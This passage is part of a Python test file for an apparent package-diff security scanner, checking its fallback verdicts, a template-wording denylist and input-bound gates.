    from trustsight.schema import DiffSummary
    from trustsight.verdict import DIRECTIONS, fallback_verdict

    facts = {
        "first-seen": PackageFact(first_seen=True),
        "first-seen-versions": PackageFact(first_seen=True, old_version="1",
                                           new_version="2"),
        "nothing-fired": PackageFact(diff_summary=DiffSummary(files_changed=["PKGBUILD"])),
        "signals": PackageFact(
            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
            score_breakdown=[ScoreEntry(rule_id="R001", severity="HIGH", weight=25)]),
        "fatal": PackageFact(
            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
            score_breakdown=[ScoreEntry(rule_id="R012", severity="FATAL", weight=0)]),
    }
    assert fallback_verdict(facts[case]).rstrip().endswith(DIRECTIONS)


def test_a_package_named_safe_does_not_trip_the_denylist():
    """B9's denylist covers template text; field values are package-owned."""
    from security_gates import gate_no_template_grants_permission

    for name in ("safe-rs", "clean-arch", "nothing-to-review"):
        fact = scan_diff(HEADER + "+pkgver=2\n", package_name=name)
        assert fact.final_score == 0, name
    assert gate_no_template_grants_permission().passed


def test_every_input_bound_is_a_literal():
    from security_gates import gate_every_input_bound_is_a_source_constant

    gate = gate_every_input_bound_is_a_source_constant()
    assert gate.passed, gate.measured
